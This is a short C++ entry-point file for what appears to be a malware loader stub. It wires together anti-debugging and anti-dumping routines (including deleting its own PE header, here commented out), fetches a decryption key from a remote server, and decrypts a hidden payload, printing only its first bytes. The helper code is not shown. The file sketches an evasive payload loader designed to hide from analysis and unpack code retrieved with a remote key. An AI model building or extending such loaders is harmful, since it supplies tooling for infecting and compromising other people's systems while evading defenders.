#include "pch.h"

#include "AntiDebugging.hpp"
#include "AntiDumping.hpp"
#include "ServerRequests.hpp"
#include "PayloadManager.hpp"

#ifndef _DEBUG
// If RELEASE
#pragma optimize("x", on)
#endif // !_DEBUG

int main() {

    // Init Antidebugging
    // AntiDebugging antiDbg;
    // antiDbg.start();

    // Delete own PE header
    // AntiDumping::DeletePEHeader();

    // antiDbg.KillIfIntegrityCheckFails();
    string response = ServerRequests::GetDecryptKey("");

    // Error handling
    if (response.length() <= 0) {
        cout << "error; response empty";
        exit(0);
    }

    PayloadManager* pm = new PayloadManager();

    pair<BYTE*,DWORD> dPayload = pm->GetDecryptedPayload(response);

    cout << dPayload.first[0] << dPayload.first[1] << endl;

    cin.get();

    // cout << "bye" << endl;

    return 0;
}
